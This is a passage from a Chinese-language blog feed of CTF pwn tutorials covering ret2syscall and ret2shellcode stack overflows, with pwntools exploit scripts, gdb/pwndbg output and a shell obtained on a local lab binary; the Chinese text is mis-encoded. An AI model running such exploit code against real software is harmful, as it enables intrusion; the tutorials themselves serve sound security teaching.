*</span><br><span class="line">sh = process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">pop_eax_ret = <span class="number">0x080bb196</span></span><br><span class="line">pop_edx_ecx_ebx_ret = <span class="number">0x0806eb90</span></span><br><span class="line">int_0x80 = <span class="number">0x08049421</span></span><br><span class="line">bin_sh = <span class="number">0x80be408</span></span><br><span class="line">payload = flat([<span class="string">&#x27;A&#x27;</span> * <span class="number">112</span>, pop_eax_ret, <span class="number">0xb</span>, pop_edx_ecx_ebx_ret, <span class="number">0</span>, <span class="number">0</span>, bin_sh, int_0x80])</span><br><span class="line"><span class="comment">#flatæ¨¡å—èƒ½å°†patternå­—ç¬¦ä¸²å’Œåœ°å€ç»“åˆå¹¶ä¸”è½¬ä¸ºå­—èŠ‚æ¨¡å¼</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å†™æ³•2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./rop&#x27;</span>)</span><br><span class="line">int_0x80=<span class="number">0x8049421</span></span><br><span class="line">bin_sh=<span class="number">0x80be408</span></span><br><span class="line">pop_other_ret=<span class="number">0x806eb90</span></span><br><span class="line">pop_eax_ret=<span class="number">0x80bb196</span></span><br><span class="line">payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">112</span>+p32(pop_eax_ret)+p32(<span class="number">0xb</span>)+p32(pop_other_ret)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p32(bin_sh)+p32(int_0x80)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å¡«å……å¤šå°‘ä¸ªå­—ç¬¦è¿™é‡Œä¸å¤šèµ˜è¿°ï¼Œå¯ä»¥çœ‹<strong>ret2text</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;ret2syscall&quot;&gt;&lt;a href=&quot;#ret2syscall&quot; class=&quot;headerlink&quot; title=&quot;ret2syscall&quot;&gt;&lt;/a&gt;ret2syscall&lt;/h2&gt;&lt;p&gt;ret2syscallï¼Œå³æ§åˆ¶ç¨‹åºæ‰§è¡Œç³»ç»Ÿè°ƒç”¨ï¼Œè·å– shell&lt;/</summary>
      
    
    
    
    <category term="ç©è½¬PWN" scheme="https://pwnling.github.io/categories/%E7%8E%A9%E8%BD%ACPWN/"/>
    
    
  </entry>
  
  <entry>
    <title>ret2shellcode</title>
    <link href="https://pwnling.github.io/2022/12/02/5-ret2shellcode/"/>
    <id>https://pwnling.github.io/2022/12/02/5-ret2shellcode/</id>
    <published>2022-12-02T14:00:00.000Z</published>
    <updated>2022-12-02T14:00:00.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><p>åœ¨æ ˆæº¢å‡ºçš„æ”»å‡»æŠ€æœ¯ä¸­é€šå¸¸æ˜¯è¦æ§åˆ¶å‡½æ•°çš„è¿”å›åœ°å€åˆ°è‡ªå·±æƒ³è¦çš„åœ°æ–¹æ‰§è¡Œè‡ªå·±æƒ³è¦æ‰§è¡Œçš„ä»£ç ã€‚ret2shellcodeä»£è¡¨è¿”å›åˆ°shellcodeä¸­å³æ§åˆ¶å‡½æ•°çš„è¿”å›åœ°å€åˆ°é¢„å…ˆè®¾å®šå¥½çš„shellcodeåŒºåŸŸä¸­å»æ‰§è¡Œshellcodeä»£ç ï¼Œè¿™æ˜¯éå¸¸å±é™©çš„ã€‚</p><h3 id="step1-32bit-or-64bit"><a href="#step1-32bit-or-64bit" class="headerlink" title="step1 32bit or 64bit?"></a>step1 32bit or 64bit?</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‘½ä»¤ï¼šfile &lt;.ELF&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROP$ file ret2shellcode </span><br><span class="line">ret2shellcode: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=47e6d638fe0f3a3ff4695edb8b6c7e83461df949, with debug_info, not stripped</span><br><span class="line">ROP$ gdb ./ret2shellcode</span><br></pre></td></tr></table></figure><h3 id="step2-checksec"><a href="#step2-checksec" class="headerlink" title="step2 checksec"></a>step2 checksec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‘½ä»¤ï¼šchecksec &lt;.ELF&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ROP$ checksec ret2shellcode</span><br><span class="line">[*] <span class="string">&#x27;/home/pwn/æ¡Œé¢/é¢˜ç›®/ROP/ret2shellcode&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><h3 id="step3-IDA32"><a href="#step3-IDA32" class="headerlink" title="step3 IDA32"></a>step3 IDA32</h3><p>æ‰“å¼€å³ä¸»å‡½æ•°main()ï¼Œç›´æ¥F5åæ±‡ç¼–ï¼Œä¼ªä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">nt __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);<span class="comment">//å±é™©å‡½æ•°</span></span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64</span>u);                  <span class="comment">//0x64uä¸ºæ— ç¬¦å·åå…­è¿›åˆ¶64   </span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gets()å¹¶æ²¡æœ‰å¯¹å…¶è¾“å…¥é•¿åº¦åšé™åˆ¶ï¼Œå› æ­¤å­˜åœ¨æº¢å‡ºï¼Œä¸”å°†è¾“å…¥çš„å€¼å¤åˆ¶åˆ°äº†buf2çš„å†…å­˜ç©ºé—´é‡Œï¼Œç‚¹å‡»buf2ï¼Œè¿›è¡Œè·³è½¬ï¼Œå‘ç°buf2åœ¨.bssæ®µå†…çš„ç©ºé—´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A064                                         ; __do_global_dtors_aux+14â†‘w</span><br><span class="line">.bss:0804A065                 align 20h</span><br><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7Bâ†‘o</span><br><span class="line">.bss:0804A080 _bss            ends</span><br><span class="line">.bss:0804A080</span><br><span class="line">.prgend:0804A0E4 ; ===========================================================================</span><br><span class="line">.prgend:0804A0E4</span><br><span class="line">.prgend:0804A0E4 ; Segment type: Zero-length</span><br><span class="line">.prgend:0804A0E4 _prgend         segment byte public &#x27;&#x27; use32</span><br><span class="line">.prgend:0804A0E4 _end            label byte</span><br><span class="line">.prgend:0804A0E4 _prgend         ends</span><br><span class="line">.prgend:0804A0E4</span><br></pre></td></tr></table></figure><h3 id="step4-æŸ¥çœ‹-bssæ®µ"><a href="#step4-æŸ¥çœ‹-bssæ®µ" class="headerlink" title="step4 æŸ¥çœ‹.bssæ®µ"></a>step4 æŸ¥çœ‹.bssæ®µ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">processï¼šgdb ret2shellcode--&gt;b main--&gt;r(run)--&gt;vmmap</span><br></pre></td></tr></table></figure><p>é€šè¿‡ vmmapï¼ŒæŸ¥çœ‹.bss æ®µå¯¹åº”çš„æ®µå…·æœ‰å¯æ‰§è¡Œæƒé™</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">0x8048000  0x8049000 r-xp     1000 0      /home/pwn/æ¡Œé¢/é¢˜ç›®/ROP/ret2shellcode</span><br><span class="line">0x8049000  0x804a000 r-xp     1000 0      /home/pwn/æ¡Œé¢/é¢˜ç›®/ROP/ret2shellcode</span><br><span class="line">0x804a000  0x804b000 rwxp     1000 1000   /home/pwn/æ¡Œé¢/é¢˜ç›®/ROP/ret2shellcode</span><br><span class="line">0xf7dcb000 0xf7fb3000 r-xp   1e8000 0      /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7fb3000 0xf7fb5000 r-xp     2000 1e7000 /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7fb5000 0xf7fb7000 rwxp     2000 1e9000 /usr/lib/i386-linux-gnu/libc-2.31.so</span><br><span class="line">0xf7fb7000 0xf7fb9000 rwxp     2000 0      </span><br><span class="line">0xf7fcb000 0xf7fcd000 rwxp     2000 0      </span><br><span class="line">0xf7fcd000 0xf7fd0000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd0000 0xf7fd1000 r-xp     1000 0      [vdso]</span><br><span class="line">0xf7fd1000 0xf7ffb000 r-xp    2a000 0      /usr/lib/i386-linux-gnu/ld-2.31.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 2a000  /usr/lib/i386-linux-gnu/ld-2.31.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 2b000  /usr/lib/i386-linux-gnu/ld-2.31.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æŠŠåªè¦æŠŠå†…å®¹å†™åˆ°ä»¥ä¸‹è¿™ä¸ªåœ°æ–¹ï¼Œç„¶åè¿”å›åœ°å€è·³è½¬åˆ° bss æ®µå°±å¯ä»¥æ‰§è¡Œ shellcode</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x804a000  0x804b000 rwxp     1000 1000   /home/pwn/æ¡Œé¢/é¢˜ç›®/ROP/ret2shellcode</span><br></pre></td></tr></table></figure><h3 id="step5-padding"><a href="#step5-padding" class="headerlink" title="step5 padding"></a>step5 padding</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ç”Ÿæˆå­—ç¬¦ï¼šcyclic 150</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ¡Œé¢$ cyclic 150</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma</span><br></pre></td></tr></table></figure><p>é€€å‡ºgdbï¼Œé‡æ–°è¿›å…¥ï¼Œå¡«å……å­—ç¬¦</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; q</span><br><span class="line">ROP$ gdb ./ret2shellcode</span><br><span class="line">GNU gdb (Ubuntu 9.1-0ubuntu1) 9.1</span><br><span class="line">Copyright (C) 2020 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type <span class="string">&quot;show copying&quot;</span> and <span class="string">&quot;show warranty&quot;</span> <span class="keyword">for</span> details.</span><br><span class="line">This GDB was configured as <span class="string">&quot;x86_64-linux-gnu&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;show configuration&quot;</span> <span class="keyword">for</span> configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For <span class="built_in">help</span>, <span class="built_in">type</span> <span class="string">&quot;help&quot;</span>.</span><br><span class="line">Type <span class="string">&quot;apropos word&quot;</span> to search <span class="keyword">for</span> commands related to <span class="string">&quot;word&quot;</span>...</span><br><span class="line">pwndbg: loaded 192 commands. Type pwndbg [filter] <span class="keyword">for</span> a list.</span><br><span class="line">pwndbg: created <span class="variable">$rebase</span>, <span class="variable">$ida</span> gdb <span class="built_in">functions</span> (can be used with <span class="built_in">print</span>/break)</span><br><span class="line">Reading symbols from ./ret2shellcode...</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/pwn/æ¡Œé¢/é¢˜ç›®/ROP/ret2shellcode </span><br><span class="line">No system <span class="keyword">for</span> you this time !!!</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma</span><br><span class="line"><span class="built_in">bye</span> <span class="built_in">bye</span> ~</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x62616164 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure><p>ï¼ï¼ï¼å…³é”®ä¿¡æ¯ æŠ¥é”™åœ°å€ï¼š0x62616164</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x62616164 <span class="keyword">in</span> ?? ()</span><br></pre></td></tr></table></figure><h3 id="step6-è®¡ç®—stackç©ºé—´å¤§å°"><a href="#step6-è®¡ç®—stackç©ºé—´å¤§å°" class="headerlink" title="step6 è®¡ç®—stackç©ºé—´å¤§å°"></a>step6 è®¡ç®—stackç©ºé—´å¤§å°</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">å‘½ä»¤ï¼šcyclic -l 0x62616164</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">æ¡Œé¢$ cyclic -l 0x62616164</span><br><span class="line">112</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">                             +-----------------+</span><br><span class="line">                             |    buf2_addr    |  åŸretè¿”å›ä½ç½®</span><br><span class="line">                             +-----------------+</span><br><span class="line">                             |   Caller<span class="string">&#x27;s ebp  | åŸsaved ebpä½ç½®ï¼ˆ4å­—èŠ‚ï¼‰</span></span><br><span class="line"><span class="string">                      ebp---&gt;+-----------------+</span></span><br><span class="line"><span class="string">                             |                 |</span></span><br><span class="line"><span class="string">                             |                 |</span></span><br><span class="line"><span class="string">                             |                 |</span></span><br><span class="line"><span class="string">                             |                 |</span></span><br><span class="line"><span class="string">                             +-----------------+                 </span></span><br><span class="line"><span class="string">                             |        s        |</span></span><br><span class="line"><span class="string">             sèµ·å§‹,ebp-0x6C--&gt;+-----------------+</span></span><br><span class="line"><span class="string"># è¿™é‡Œçš„sçš„å€¼å­˜æ”¾ç€shellcodeå’Œä¸€äº›åƒåœ¾æ•°æ®ï¼Œè€Œä¸æ˜¯å•çº¯çš„åƒåœ¾æ•°æ®ï¼Œé‡Œé¢å«æœ‰æ§åˆ¶ç¨‹åºæµçš„æ•°æ®ï¼Œå› ä¸ºåé¢æœ‰</span></span><br><span class="line"><span class="string"># strcpyå‡½æ•°è¦å°†så¤åˆ¶åˆ°bufé‡Œï¼Œè€Œæˆ‘ä»¬è¿”å›åœ°å€ä¾¿æ˜¯buf2_addrï¼Œè¿™æ ·æˆ‘ä»¬çš„è¿”å›åœ°å€å°±å«æœ‰shellcodeï¼Œ</span></span><br><span class="line"><span class="string"># shellcode.ljust(112,&#x27;</span>a<span class="string">&#x27;) å°±æ˜¯å…ˆå¡«å……shellcodeï¼Œå†å¡«å……å­—ç¬¦&#x27;</span>a<span class="string">&#x27;ï¼Œæ•…è¿”å›åœ°å€buf2_addrå°±å…ˆå¡«å……</span></span><br><span class="line"><span class="string"># shellcodeæ¥æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ          </span></span><br></pre></td></tr></table></figure><h3 id="step7-exp"><a href="#step7-exp" class="headerlink" title="step7 exp"></a>step7 exp</h3><p>shellcraft.sh()æ˜¯è‡ªå¸¦çš„ä¸€æ®µshellcodeï¼Œå¯ä»¥è‡ªå·±å†™ï¼Œä¹Ÿå¯ä»¥å»è¿™é‡Œæ‰¾ï¼Œç„¶åé€šè¿‡ljustæ–¹æ³•å·¦å¯¹é½å¡«å……å­—èŠ‚ï¼Œç›´åˆ°æº¢å‡ºåˆ°è¿”å›åœ°å€ï¼Œbuf2_addrå³æ˜¯å¯æ‰§è¡Œshellcodeçš„åœ°å€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line"><span class="built_in">print</span>(shellcraft.sh())//<span class="built_in">print</span>è¯­å¥å¯å»æ‰</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span>//buf2åœ°å€</span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>) + p32(buf2_addr))//è¦åœ¨<span class="string">&#x27;A&#x27;</span>å‰é¢åŠ b</span><br><span class="line"><span class="built_in">print</span>(shellcode.ljust(<span class="number">112</span>,<span class="string">b&#x27;A&#x27;</span>))//è¦åœ¨<span class="string">&#x27;A&#x27;</span>å‰é¢åŠ b</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>shellcode.ljust(112,â€™aâ€™) å¯ä»¥æ§åˆ¶åƒåœ¾æ•°æ®ä¸ shellcode åˆèµ·æ¥çš„é•¿åº¦ä¸º112ï¼Œä¸Šé¢æ˜¯ç»™å‡ºçš„ exp ç­‰ä»·äºä¸‹é¢çš„</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">shellcode += <span class="string">&#x27;A&#x27;</span>*(<span class="number">112</span>-<span class="built_in">len</span>(shellcode))</span><br><span class="line"><span class="built_in">print</span>(shellcode)</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">sh.sendline(shellcode + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="step8-pwn"><a href="#step8-pwn" class="headerlink" title="step8 pwn"></a>step8 pwn</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æµ‹è¯•å‘½ä»¤ï¼š</span><br><span class="line">whoami  </span><br><span class="line">ls</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ROP$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2shellcode&#x27;</span>: pid 2310</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">No system <span class="keyword">for</span> you this time !!!</span><br><span class="line"><span class="built_in">bye</span> <span class="built_in">bye</span> </span><br><span class="line">~$ <span class="built_in">whoami</span></span><br><span class="line">pwn</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">core    ret2libc1  ret2libc3      ret2syscall  tools</span><br><span class="line">exp.py    ret2libc2  ret2shellcode  ret2text</span><br></pre></td></tr></table></figure><p>æœ€åpwnå®Œï¼Œå¯ä»¥Ctrl+Cé€€å‡ºshell</p><h2 id="æ˜“é”™ç‚¹"><a href="#æ˜“é”™ç‚¹" class="headerlink" title="æ˜“é”™ç‚¹"></a>æ˜“é”™ç‚¹</h2><p>step3ä¸­æ˜¾ç¤ºå­—ç¬¦æ•°ç»„sè·ç¦»ebpä¸º0x64å­—èŠ‚ï¼ˆå³100å­—èŠ‚ï¼‰ï¼Œæ­¤å¤„ä¸ºé™æ€åˆ†æï¼Œå¯èƒ½å­˜åœ¨ä¸å‡†ç¡®ï¼Œæ•…è¦è¿›è¡ŒåŠ¨æ€è°ƒè¯•åˆ†æï¼Œå¦‚æœç›´æ¥ä½¿ç”¨step5å’Œstep6åˆ™å¯ç›´æ¥å¾—å‡ºå¡«å……é•¿åº¦ï¼Œå¯ä¸ç”¨åŠ¨æ€åˆ†æ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ä»¬åŠ¨æ€åˆ†æä¸‹ï¼Œä¾æ—§å…ˆè°ƒè¯•ä¸‰è¿ï¼Œnæ‰§è¡Œä¸‹å»ï¼Œå½“æ‰§è¡Œåˆ°ä¸‹é¢æ—¶ï¼Œå†nextï¼Œä¼šè®©æˆ‘ä»¬è¾“å…¥æ•°æ®ï¼Œæˆ‘ä»¬éšä¾¿è¾“å‡ ä¸ªå­—ç¬¦</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">0x8048570</span> &lt;main+<span class="number">67</span>&gt;     mov    dword ptr [esp + <span class="number">4</span>], <span class="number">0</span></span><br><span class="line">  <span class="number">0x8048578</span> &lt;main+<span class="number">75</span>&gt;     mov    dword ptr [esp], eax</span><br><span class="line">  <span class="number">0x804857b</span> &lt;main+<span class="number">78</span>&gt;     call   setvbuf@plt &lt;setvbuf@plt&gt;</span><br><span class="line"></span><br><span class="line">  <span class="number">0x8048580</span> &lt;main+<span class="number">83</span>&gt;     mov    dword ptr [esp], <span class="number">0x8048660</span></span><br><span class="line">  <span class="number">0x8048587</span> &lt;main+<span class="number">90</span>&gt;     call   <span class="built_in">puts</span>@plt &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line"></span><br><span class="line">â–º <span class="number">0x804858c</span> &lt;main+<span class="number">95</span>&gt;     lea    eax, [esp + <span class="number">0x1c</span>]</span><br><span class="line">  <span class="number">0x8048590</span> &lt;main+<span class="number">99</span>&gt;     mov    dword ptr [esp], eax</span><br><span class="line">  <span class="number">0x8048593</span> &lt;main+<span class="number">102</span>&gt;    call   gets@plt &lt;gets@plt&gt;</span><br><span class="line"></span><br><span class="line">  <span class="number">0x8048598</span> &lt;main+<span class="number">107</span>&gt;    mov    dword ptr [esp + <span class="number">8</span>], <span class="number">0x64</span></span><br><span class="line">  <span class="number">0x80485a0</span> &lt;main+<span class="number">115</span>&gt;    lea    eax, [esp + <span class="number">0x1c</span>]</span><br><span class="line">  <span class="number">0x80485a4</span> &lt;main+<span class="number">119</span>&gt;    mov    dword ptr [esp + <span class="number">4</span>], eax</span><br></pre></td></tr></table></figure><p>stackå‘½ä»¤å°½é‡å¤§ç‚¹ï¼Œå¯ç”¨stack 50ï¼Œèƒ½è§‚å¯Ÿåˆ°ebpä¸å­—ç¬¦å¡«å……çš„è·ç¦»å³å¯ï¼ˆè¯´æ˜ï¼šâ€˜aaaaâ€™æœ‰ä¸¤ä¸ªï¼Œé€šå¸¸åœ°å€æŒ‡å‘çš„å³ä¸ºå…¶æ‰€å­˜æ”¾çš„å€¼ï¼Œå¦‚æœæœ‰åŒç®­å¤´ï¼Œæ¯”å¦‚ESPçš„åœ°å€ä¸º<strong>0xffffd0f0</strong>ï¼Œå­˜æ”¾çš„æ˜¯æŒ‡é’ˆ<strong>0xffffd10c</strong>ï¼Œè€Œè¿™ä¸ªæŒ‡é’ˆåˆå­˜æ”¾ç€â€˜aaaaâ€™ï¼Œæ•…çœŸå®å­˜æ”¾â€˜aaaaâ€™çš„åœ°å€æ˜¯<strong>0xffffd10c</strong>ï¼‰</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>â”‚ esp  <span class="number">0xffffd0f0</span> â€”â–¸ <span class="number">0xffffd10c</span> â—‚â€” <span class="string">&#x27;aaaa&#x27;</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0004</span>â”‚      <span class="number">0xffffd0f4</span> â—‚â€” <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0008</span>â”‚      <span class="number">0xffffd0f8</span> â—‚â€” <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">000</span>câ”‚      <span 